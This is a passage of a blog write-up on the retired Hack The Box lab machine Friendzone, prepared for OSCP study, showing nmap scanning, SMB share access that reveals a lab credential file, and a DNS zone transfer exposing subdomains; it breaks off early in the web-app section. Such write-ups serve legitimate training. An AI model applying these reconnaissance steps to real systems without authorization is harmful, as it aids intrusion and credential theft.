@@ -1,0 +1,566 @@
+<!DOCTYPE html><html lang="ko"><head><meta charSet="utf-8"/><meta http-equiv="x-ua-compatible" content="ie=edge"/><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"/><meta name="generator" content="Gatsby 5.13.7"/><meta data-react-helmet="true" name="description" content="Solvin the Friendzone machine from HTB"/><meta data-react-helmet="true" name="viewport" content="width=device-width, initial-scale=1.0"/><meta data-react-helmet="true" http-equiv="Content-Type" content="text/html;charset=UTF-8"/><meta data-react-helmet="true" property="og:type" content="website"/><meta data-react-helmet="true" property="og:title" content="OSCP Prep: Hack The Box Friendzone"/><meta data-react-helmet="true" property="og:description" content="Solvin the Friendzone machine from HTB"/><meta data-react-helmet="true" property="og:image" content="/static/3a886a5b90c687d0904b884b639157cc/First.png"/><meta data-react-helmet="true" property="og:url"/><meta data-react-helmet="true" property="og:site_name" content="OSCP Prep: Hack The Box Friendzone"/><meta data-react-helmet="true" name="twitter:card" content="summary"/><meta data-react-helmet="true" name="twitter:title" content="OSCP Prep: Hack The Box Friendzone"/><meta data-react-helmet="true" name="twitter:description" content="Solvin the Friendzone machine from HTB"/><meta data-react-helmet="true" name="twitter:image" content="/static/3a886a5b90c687d0904b884b639157cc/First.png"/><meta data-react-helmet="true" name="twitter:site" content="@Hosan"/><meta data-react-helmet="true" name="twitter:creator" content="@Hosan"/><meta data-react-helmet="true" name="google-site-verification" content="FCIdHVjw_jBPbB0l6gXODqTFlM47h7YaiUfT1hIZqfI"/><meta data-react-helmet="true" name="naver-site-verification" content="aaa42c74638f5011238f2979942a4c6bb674bee0"/><style data-href="/styles.6f5efa0135677e26f5fe.css" data-identity="gatsby-global-css">code[class*=language-],pre[class*=language-]{word-wrap:normal;background:none;color:#fff;font-family:Consolas,Monaco,Andale Mono,Ubuntu Mono,monospace;font-size:1em;-webkit-hyphens:none;hyphens:none;line-height:1.5;tab-size:4;text-align:left;text-shadow:0 -.1em .2em #000;white-space:pre;word-break:normal;word-spacing:normal}:not(pre)>code[class*=language-],pre[class*=language-]{background:#141414}pre[class*=language-]{border:.3em solid #545454;border-radius:.5em;box-shadow:inset 1px 1px .5em #000;margin:.5em 0;overflow:auto;padding:1em}pre[class*=language-]::selection{background:#27292a}code[class*=language-] ::selection,code[class*=language-]::selection,pre[class*=language-] ::selection,pre[class*=language-]::selection{background:hsla(0,0%,93%,.15);text-shadow:none}:not(pre)>code[class*=language-]{border:.13em solid #545454;border-radius:.3em;box-shadow:inset 1px 1px .3em -.1em #000;padding:.15em .2em .05em;white-space:normal}.token.cdata,.token.comment,.token.doctype,.token.prolog{color:#787878}.token.namespace,.token.punctuation{opacity:.7}.token.boolean,.token.deleted,.token.number,.token.tag{color:#cf694a}.token.builtin,.token.constant,.token.keyword,.token.property,.token.selector,.token.symbol{color:#f9ee9a}.language-css .token.string,.style .token.string,.token.attr-name,.token.attr-value,.token.char,.token.entity,.token.inserted,.token.operator,.token.string,.token.url,.token.variable{color:#919e6b}.token.atrule{color:#7386a5}.token.important,.token.regex{color:#e9c163}.token.bold,.token.important{font-weight:700}.token.italic{font-style:italic}.token.entity{cursor:help}.language-markup .token.attr-name,.language-markup .token.punctuation,.language-markup .token.tag{color:#ad895c}.token{position:relative;z-index:1}.line-highlight.line-highlight{background:rgba(84,84,84,.25);background:linear-gradient(90deg,rgba(84,84,84,.1) 70%,rgba(84,84,84,0));border-bottom:1px dashed #545454;border-top:1px dashed #545454;margin-top:.75em;z-index:0}.line-highlight.line-highlight:before,.line-highlight.line-highlight[data-end]:after{background-color:#8794a6;color:#f5f2f0}</style><title data-react-helmet="true">OSCP Prep: Hack The Box Friendzone</title><link data-react-helmet="true" rel="dns-prefetch" href="https://fonts.gstatic.com"/><link data-react-helmet="true" rel="shortcut icon" href="data:image/png;base64,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"/><link rel="canonical" href="https://hosahn.github.io/240817/" data-baseprotocol="https:" data-basehost="hosahn.github.io"/><style>.gatsby-image-wrapper{position:relative;overflow:hidden}.gatsby-image-wrapper picture.object-fit-polyfill{position:static!important}.gatsby-image-wrapper img{bottom:0;height:100%;left:0;margin:0;max-width:none;padding:0;position:absolute;right:0;top:0;width:100%;object-fit:cover}.gatsby-image-wrapper [data-main-image]{opacity:0;transform:translateZ(0);transition:opacity .25s linear;will-change:opacity}.gatsby-image-wrapper-constrained{display:inline-block;vertical-align:top}</style><noscript><style>.gatsby-image-wrapper noscript [data-main-image]{opacity:1!important}.gatsby-image-wrapper [data-placeholder-image]{opacity:0!important}</style></noscript><script type="module">const e="undefined"!=typeof HTMLImageElement&&"loading"in HTMLImageElement.prototype;e&&document.body.addEventListener("load",(function(e){const t=e.target;if(void 0===t.dataset.mainImage)return;if(void 0===t.dataset.gatsbyImageSsr)return;let a=null,n=t;for(;null===a&&n;)void 0!==n.parentNode.dataset.gatsbyImageWrapper&&(a=n.parentNode),n=n.parentNode;const o=a.querySelector("[data-placeholder-image]"),r=new Image;r.src=t.currentSrc,r.decode().catch((()=>{})).then((()=>{t.style.opacity=1,o&&(o.style.opacity=0,o.style.transition="opacity 500ms linear")}))}),!0);</script><link rel="sitemap" type="application/xml" href="/sitemap-index.xml"/></head><body><div id="___gatsby"><div style="outline:none" tabindex="-1" id="gatsby-focus-wrapper"><style data-emotion="css 13ku56z">.css-13ku56z{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;height:100%;}</style><main class="css-13ku56z e1strnqo0"><style data-emotion="css-global kxm5mf">@import url('https://fonts.googleapis.com/css2?family=Nanum+Myeongjo:wght@400;700;800&display=swap');*{padding:0;margin:0;box-sizing:border-box;font-family:'Nanum Myeongjo',serif;}html,body,#___gatsby{height:100%;}a,a:hover{color:inherit;-webkit-text-decoration:none;text-decoration:none;cursor:pointer;}</style><style data-emotion="css 1gh8kjo">.css-1gh8kjo{position:-webkit-sticky;position:-webkit-sticky;position:sticky;z-index:1;top:0;width:100%;padding-top:20px;padding-bottom:20px;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-pack:end;-ms-flex-pack:end;-webkit-justify-content:end;justify-content:end;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;background-color:#7490b5;}.css-1gh8kjo button{border:none;margin-right:30px;background-color:transparent;cursor:pointer;}@media (max-width: 768px){.css-1gh8kjo{-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;width:100%;text-align:center;}}</style><div class="css-1gh8kjo e15l4yeg4"><style data-emotion="css 7w70ja">.css-7w70ja{margin-right:10px;z-index:2;color:black;font-size:15px;font-weight:bold;font-family:'EliceDigitalBaeum';}</style><button class="css-7w70ja e15l4yeg3"><style data-emotion="css 2331mw">.css-2331mw{z-index:3;}.css-2331mw:hover{background-image:linear-gradient(transparent 60%, white 40%);}</style><a class="css-2331mw e15l4yeg1" href="/">Main</a></button><button class="css-7w70ja e15l4yeg3"><a class="css-2331mw e15l4yeg1" href="/search/">Search</a></button><button class="css-7w70ja e15l4yeg3"><a href="https://github.com/hosahn" class="css-2331mw e15l4yeg0">Github</a></button><button class="css-7w70ja e15l4yeg3"><a href="https://bottlenose-apology-5f4.notion.site/6cefa80ae2a642b8b2523495d3d4bcef" class="css-2331mw e15l4yeg0">About</a></button><button class="css-7w70ja e15l4yeg3"><a class="css-2331mw e15l4yeg1" href="/contact/">Contact</a></button></div><style data-emotion="css 16cz9yp">.css-16cz9yp{position:relative;width:100%;height:400px;}@media (max-width: 768px){.css-16cz9yp{height:300px;}}</style><div class="css-16cz9yp e1opi4mu1"><style data-emotion="css 1bjn9yo">.css-1bjn9yo{z-index:-1;width:100%;height:400px;object-fit:cover;-webkit-filter:brightness(0.25);filter:brightness(0.25);}@media (max-width: 768px){.css-1bjn9yo{height:300px;}}</style><div data-gatsby-image-wrapper="" style="position:absolute" class="gatsby-image-wrapper gatsby-image-wrapper-constrained css-1bjn9yo e1opi4mu0"><div style="max-width:1024px;display:block"><img alt="" role="presentation" aria-hidden="true" src="data:image/svg+xml;charset=utf-8,%3Csvg%20height=&#x27;544&#x27;%20width=&#x27;1024&#x27;%20xmlns=&#x27;http://www.w3.org/2000/svg&#x27;%20version=&#x27;1.1&#x27;%3E%3C/svg%3E" style="max-width:100%;display:block;position:static"/></div><img aria-hidden="true" data-placeholder-image="" style="opacity:1;transition:opacity 500ms linear" decoding="async" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAIAAADwazoUAAAACXBIWXMAAAsTAAALEwEAmpwYAAABWElEQVR42mN4d+/+90vHbj88c+HF4y/v3rx7+/o90YghNLUsLLkwKK04IL08LKMilBTEwCCkxyCszyBqwCCkC0Z6DIJIDCgbhoSBSA/EgEgxK1oxK1gxSZgxy1sCEZOMBYgha8kkC2YAZcHiUFlZCyZZc2Y5sLiiFQODlBmzkQtHRCSDnAWjlj2zqSujshWzmRuLhTsDUBooqGTFqGwNZDOq2TKburFYuTNp2zNImzPIWzAwSJsBOUKLm1ks3VmdfLiLMjhiojkT4jgiIznjYpkNnTmB3NgYoOnsASFcyQlcKQmsrn4MCpZgzSCbndl8gxhkzBk17ICqmQ2cmPSdmPUdWczdmLTsmXQcQMjQmUnXASjFrO/EpOMIFGGQBWqWs2CQNWcQNwFxZMwZpEyBxkGRpClIRBrGBTHAskBBoBY5iGYgAjoDSMpDkCUCyVngZCM0k4co0QwATxiTzfiXQ8AAAAAASUVORK5CYII=" alt=""/><picture><source type="image/webp" data-srcset="/static/3a886a5b90c687d0904b884b639157cc/e3aa4/First.webp 256w,/static/3a886a5b90c687d0904b884b639157cc/09106/First.webp 512w,/static/3a886a5b90c687d0904b884b639157cc/60ee5/First.webp 1024w" sizes="(min-width: 1024px) 1024px, 100vw"/><img data-gatsby-image-ssr="" data-main-image="" style="opacity:0" sizes="(min-width: 1024px) 1024px, 100vw" decoding="async" loading="lazy" data-src="/static/3a886a5b90c687d0904b884b639157cc/b43a6/First.png" data-srcset="/static/3a886a5b90c687d0904b884b639157cc/33770/First.png 256w,/static/3a886a5b90c687d0904b884b639157cc/15341/First.png 512w,/static/3a886a5b90c687d0904b884b639157cc/b43a6/First.png 1024w" alt="thumbnail"/></picture><noscript><picture><source type="image/webp" srcSet="/static/3a886a5b90c687d0904b884b639157cc/e3aa4/First.webp 256w,/static/3a886a5b90c687d0904b884b639157cc/09106/First.webp 512w,/static/3a886a5b90c687d0904b884b639157cc/60ee5/First.webp 1024w" sizes="(min-width: 1024px) 1024px, 100vw"/><img data-gatsby-image-ssr="" data-main-image="" style="opacity:0" sizes="(min-width: 1024px) 1024px, 100vw" decoding="async" loading="lazy" src="/static/3a886a5b90c687d0904b884b639157cc/b43a6/First.png" srcSet="/static/3a886a5b90c687d0904b884b639157cc/33770/First.png 256w,/static/3a886a5b90c687d0904b884b639157cc/15341/First.png 512w,/static/3a886a5b90c687d0904b884b639157cc/b43a6/First.png 1024w" alt="thumbnail"/></picture></noscript><script type="module">const t="undefined"!=typeof HTMLImageElement&&"loading"in HTMLImageElement.prototype;if(t){const t=document.querySelectorAll("img[data-main-image]");for(let e of t){e.dataset.src&&(e.setAttribute("src",e.dataset.src),e.removeAttribute("data-src")),e.dataset.srcset&&(e.setAttribute("srcset",e.dataset.srcset),e.removeAttribute("data-srcset"));const t=e.parentNode.querySelectorAll("source[data-srcset]");for(let e of t)e.setAttribute("srcset",e.dataset.srcset),e.removeAttribute("data-srcset");e.complete&&(e.style.opacity=1,e.parentNode.parentNode.querySelector("[data-placeholder-image]").style.opacity=0)}}</script></div><style data-emotion="css m1156n">.css-m1156n{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;width:768px;height:100%;margin:0 auto;padding:60px 0;color:#ffffff;}@media (max-width: 768px){.css-m1156n{width:100%;padding:40px 20px;}}</style><div class="css-m1156n e1st1jau3"><style data-emotion="css gywgo7">.css-gywgo7{display:grid;place-items:center;width:40px;height:40px;border-radius:50%;background:#ffffff;color:#000000;font-size:22px;cursor:pointer;box-shadow:0 0 10px rgba(0, 0, 0, 0.3);}@media (max-width: 768px){.css-gywgo7{width:30px;height:30px;font-size:18px;}}</style><div class="css-gywgo7 e1st1jau2"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="arrow-left" class="svg-inline--fa fa-arrow-left " role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M9.4 233.4c-12.5 12.5-12.5 32.8 0 45.3l160 160c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L109.2 288 416 288c17.7 0 32-14.3 32-32s-14.3-32-32-32l-306.7 0L214.6 118.6c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0l-160 160z"></path></svg></div><style data-emotion="css gn4qtp">.css-gn4qtp{display:-webkit-box;overflow:hidden;overflow-wrap:break-word;margin-top:auto;text-overflow:ellipsis;white-space:normal;-webkit-line-clamp:2;-webkit-box-orient:vertical;font-size:45px;font-weight:800;}@media (max-width: 768px){.css-gn4qtp{font-size:30px;}}</style><div class="css-gn4qtp e1st1jau1">OSCP Prep: Hack The Box Friendzone</div><style data-emotion="css 3gcnt2">.css-3gcnt2{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-pack:justify;-webkit-justify-content:space-between;justify-content:space-between;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;margin-top:10px;font-size:18px;font-weight:700;}@media (max-width: 768px){.css-3gcnt2{-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;-webkit-align-items:flex-start;-webkit-box-align:flex-start;-ms-flex-align:flex-start;align-items:flex-start;font-size:15px;font-weight:400;}}</style><div class="css-3gcnt2 e1st1jau0"><div>hackthebox / full-machine</div><div>2024.08.15.</div></div></div></div><style data-emotion="css uo146q">.css-uo146q{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;width:768px;margin:0 auto;padding:100px 0;word-break:break-all;line-height:1.8;font-size:16px;font-weight:400;}.css-uo146q p{padding:3px 0;}.css-uo146q h1,.css-uo146q h2,.css-uo146q h3{font-weight:800;margin-bottom:30px;}.css-uo146q *+h1,.css-uo146q *+h2,.css-uo146q *+h3{margin-top:80px;}.css-uo146q hr+h1,.css-uo146q hr+h2,.css-uo146q hr+h3{margin-top:0;}.css-uo146q h1{font-size:30px;}.css-uo146q h2{font-size:25px;}.css-uo146q h3{font-size:20px;}.css-uo146q blockquote{margin:30px 0;padding:5px 15px;border-left:2px solid #000000;font-weight:800;}.css-uo146q ol,.css-uo146q ul{margin-left:20px;padding:30px 0;}.css-uo146q hr{border:1px solid #000000;margin:100px 0;}.css-uo146q a{color:#4263eb;-webkit-text-decoration:underline;text-decoration:underline;}.css-uo146q pre[class*='language-']{margin:30px 0;padding:15px;font-size:15px;}.css-uo146q pre[class*='language-']::-webkit-scrollbar-thumb{background:rgba(255, 255, 255, 0.5);border-radius:3px;}.css-uo146q code[class*='language-'],.css-uo146q pre[class*='language-']{tab-size:2;}@media (max-width: 768px){.css-uo146q{width:100%;padding:80px 20px;line-height:1.6;font-size:14px;}.css-uo146q h1{font-size:23px;}.css-uo146q h2{font-size:20px;}.css-uo146q h3{font-size:17px;}.css-uo146q img{width:100%;}.css-uo146q hr{margin:50px 0;}}</style><div class="css-uo146q e1ijh0y10"><h2>1. Machine Info</h2>
+<p>Friendzone is a retired machine from Hack the Box, and it is “actually” easy rated. However, many users find the rating misleading, as this machine is considerably more complex than other machines rated at the same level, often presenting “realistic” rabbit holes.</p>
+<p><span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 768px; "
+    >
+      <a
+    class="gatsby-resp-image-link"
+    href="/static/d434c084202acc1b163b799eb8680aab/ca504/Friendzone.png"
+    style="display: block"
+    target="_blank"
+    rel="noopener"
+  >
+    <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 43.22916666666667%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAYAAAAywQxIAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABmUlEQVR42o2RyY7TQBRF/QEQtRPHU8VTxa7yUHYck+BWT6FHsUAgkFgCS7b9Ef1PfN7lVXWC0kJCLI7qWX73vslS2Q4ju8cYah5wXbzH16zDl1DgO8/xWPj4mXn4kErcdGe4q7bY1Ve46D7hrP6Ic/mA280Ot+MVLutrWE/vPuN8fYOhvceg7rCMB9SsQhUI1EGBPuRoAw5B8TJqIOMGIl1D8i2G8o3JL7Iegq+QsDWsXz++YTOegneXWKpTTLwcr31BSMOrPZOA8AqchCVmcQuWSfR9jXkkMY8rMK5gsxpWUrVwFhWmoaakhAYO/XCoS/3O6NVMyfAYm/InfgU7KI3WiZTRW7m6QJCt4Cc93GhF8RoudXDAoQK6iK1NjjihKWzN/ttL22dDnw9g+QY+b7BoSvgFjaQ7W7xEGx+YxwqR2GJRbOEmLSL59k9s+bkygUtJbtbATV8KnQNHhhqjSZ4n0NpQKHikt9g+mLLS7MXskv0H+jj7nevCekInpqMUGwUxVggEXdCTf+3qX8wIn/bspR28uDPN/AY+Wv5LYdM/+AAAAABJRU5ErkJggg=='); background-size: cover; display: block;"
+  ></span>
+  <picture>
+          <source
+              srcset="/static/d434c084202acc1b163b799eb8680aab/a59e9/Friendzone.webp 192w,
+/static/d434c084202acc1b163b799eb8680aab/0ca9f/Friendzone.webp 384w,
+/static/d434c084202acc1b163b799eb8680aab/dc9b9/Friendzone.webp 768w,
+/static/d434c084202acc1b163b799eb8680aab/e2c2f/Friendzone.webp 1152w,
+/static/d434c084202acc1b163b799eb8680aab/70e46/Friendzone.webp 1259w"
+              sizes="(max-width: 768px) 100vw, 768px"
+              type="image/webp"
+            />
+          <source
+            srcset="/static/d434c084202acc1b163b799eb8680aab/3b721/Friendzone.png 192w,
+/static/d434c084202acc1b163b799eb8680aab/66595/Friendzone.png 384w,
+/static/d434c084202acc1b163b799eb8680aab/fe486/Friendzone.png 768w,
+/static/d434c084202acc1b163b799eb8680aab/d2d74/Friendzone.png 1152w,
+/static/d434c084202acc1b163b799eb8680aab/ca504/Friendzone.png 1259w"
+            sizes="(max-width: 768px) 100vw, 768px"
+            type="image/png"
+          />
+          <img
+            class="gatsby-resp-image-image"
+            src="/static/d434c084202acc1b163b799eb8680aab/fe486/Friendzone.png"
+            alt="Friendzone"
+            title=""
+            loading="lazy"
+            decoding="async"
+            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+          />
+        </picture>
+  </a>
+    </span></p>
+<p>User reviews suggest that Friendzone is closer in difficulty to a medium-rated machine.</p>
+<blockquote>
+<p>But let’s dive straight into the details of machine!</p>
+</blockquote>
+<h2>2. Enumeration</h2>
+<p>As usual, we start with an nmap-scan</p>
+<div class="gatsby-highlight" data-language="text"><pre class="language-text"><code class="language-text">┌──(hosan㉿kali)-[~/oscp/htb-box/friendzone]
+└─$ sudo nmap 10.10.10.123 -Pn -sC -sV
+[sudo] password for hosan: 
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-16 13:37 EDT
+Nmap scan report for 10.10.10.123
+Host is up (0.062s latency).
+Not shown: 993 closed tcp ports (reset)
+PORT    STATE SERVICE     VERSION
+21/tcp  open  ftp         vsftpd 3.0.3
+22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 a9:68:24:bc:97:1f:1e:54:a5:80:45:e7:4c:d9:aa:a0 (RSA)
+|   256 e5:44:01:46:ee:7a:bb:7c:e9:1a:cb:14:99:9e:2b:8e (ECDSA)
+|_  256 00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b (ED25519)
+53/tcp  open  domain      ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)
+| dns-nsid: 
+|_  bind.version: 9.11.3-1ubuntu1.2-Ubuntu
+80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Friend Zone Escape software
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+443/tcp open  ssl/http    Apache httpd 2.4.29
+|_http-title: 404 Not Found
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn: 
+|_  http/1.1
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+| ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO
+| Not valid before: 2018-10-05T21:02:30
+|_Not valid after:  2018-11-04T21:02:30
+445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
+Service Info: Hosts: FRIENDZONE, 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+....and so on</code></pre></div>
+<p>So we have several services running on this IP:</p>
+<ul>
+<li>ftp (which was not interesting at all)</li>
+<li>samba</li>
+<li>http</li>
+<li>https</li>
+<li>DNS</li>
+</ul>
+<p>And our domain name is friendzone.red.
+Let’s take a look into each services, step by step.</p>
+<h3>2.1 SMB Samba</h3>
+<p>With quick search with crackmapexec, I could easily find that we have read access on “general” and r/w access on “Development” share. And in general share:</p>
+<div class="gatsby-highlight" data-language="text"><pre class="language-text"><code class="language-text">┌──(hosan㉿kali)-[~/oscp/htb-box/friendzone]
+└─$ smbclient //10.10.10.123/general    
+Password for [WORKGROUP\hosan]:
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Wed Jan 16 15:10:51 2019
+  ..                                  D        0  Tue Sep 13 10:56:24 2022
+  creds.txt                           N       57  Tue Oct  9 19:52:42 2018
+
+                3545824 blocks of size 1024. 1640980 blocks available</code></pre></div>
+<p>We could find creds.txt with <strong>admin:WORKWORKHhallelujah@#</strong>. Good start indeed. Let’s move on to DNS</p>
+<h3>2.2 DNS Zone Transfer</h3>
+<p>I just quickly tried zone transfer on our host friendzone.red</p>
+<div class="gatsby-highlight" data-language="text"><pre class="language-text"><code class="language-text">┌──(hosan㉿kali)-[~/oscp/htb-box/friendzone]
+└─$ dig axfr friendzone.red @10.10.10.123 
+; &lt;&lt;>> DiG 9.19.21-1-Debian &lt;&lt;>> axfr friendzone.red @10.10.10.123
+;; global options: +cmd
+friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
+friendzone.red.         604800  IN      AAAA    ::1
+friendzone.red.         604800  IN      NS      localhost.
+friendzone.red.         604800  IN      A       127.0.0.1
+administrator1.friendzone.red. 604800 IN A      127.0.0.1
+hr.friendzone.red.      604800  IN      A       127.0.0.1
+uploads.friendzone.red. 604800  IN      A       127.0.0.1
+friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
+;; Query time: 124 msec
+;; SERVER: 10.10.10.123#53(10.10.10.123) (TCP)
+;; WHEN: Fri Aug 16 14:23:27 EDT 2024
+;; XFR size: 8 records (messages 1, bytes 289)</code></pre></div>
+<p>We found 3 subdomains. Time to move on to webapp.</p>
+<h3>2.3 <a href="http://friendzone.red" target="_blank" rel="nofollow">http://friendzone.red</a></h3>
+<p><span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 768px; "
+    >
+      <a
+    class="gatsby-resp-image-link"
+    href="/static/ee58024cc6d33649098f4ac8f873156a/8728b/friendzone_80.png"
+    style="display: block"
+    target="_blank"
+    rel="noopener"
+  >
+    <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 97.39583333333333%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAATCAYAAACQjC21AAAACXBIWXMAAA7DAAAOwwHHb6hkAAAC7UlEQVR42m1UO0srURBeFbER/4BNQMFKK1tFtEhnERtbuysmm93cGLhXuAFB0NpCK7FSsLGxsFMIKoKKkuAz5qHGxFfwha8kfne/gbNujAPDmZ0z55uZb85ZzesLwPz9F4HhfzDNYQSHDPiMEPRgGH4zBL/X2teDlm8Y3kEfdGvVvQZ065zPb9lW7JDxB35r/TWoQysWi7C1UAQllUohHo/j7OzMstNIJpM4Pj7GyckJDvb3cXh4aNlxPD4+4vMTcGJo+EE+Pj7w/v6OUqmEQqEg329vb9aBkuzT/2khcY+rUzQ6qAxSWWhT9vb28PLyYgcnEgkYhoGenh6sr6+Lj6CMV0nsChUwlaCU/v5+bGxsiH1zc4Pm5mZomobq6mrU19djamqqrGKp0AmoqqSQt87OTmSzWbvayclJiRsdHUVVVZWALy0t2ZVWADr56OvrQ0NDAyYmJrC6umpXQiG/ra2tAtjR0SEcKwzt+zDYWiAQkODa2lpZu7u7bUB2EA6HpW21Pz4+bu/bgCMjI2hqahJuGFRTU4O6ujqx29raBGh2dhaNjY3iY8tUAvN7eXm5vOWuri4biKvT1nUdi4uLcLlcmJmZkWnPzc0Jx6pKFlQG6Ha7pbr29nb09vbC4/FgYGAAoVBIBhSLxZDJZCr4Nk1TAEmDDchNvoTLy8sy8p0D48V27qmVvLe0tCAYDH5dbMrDw4PcufPzc3l2TEBNp9Pyvba2houLC9HT01Pxc//p6QnT09MYGxsrB+S73NzclHe6sLCASCQib3dlZQU7OzsCuLW1he3tbbmTTE7//Pw8dnd3kcvlyjnkxWQ2tsarwwA+OyqpoPKSMzGrpP/19VV4vbq6+nrL37mi8DADCczWaPPPQ//R0ZEA84/0/PxcMaQKQKWsgNwR8Pb2VkCj0agoqeBrccZXVOgcDqthFRwQD5N83j3aTEKbCahq+j+2TCEv19fXuL+/F06Z4O7uDvl8XlZWSyrUt/opK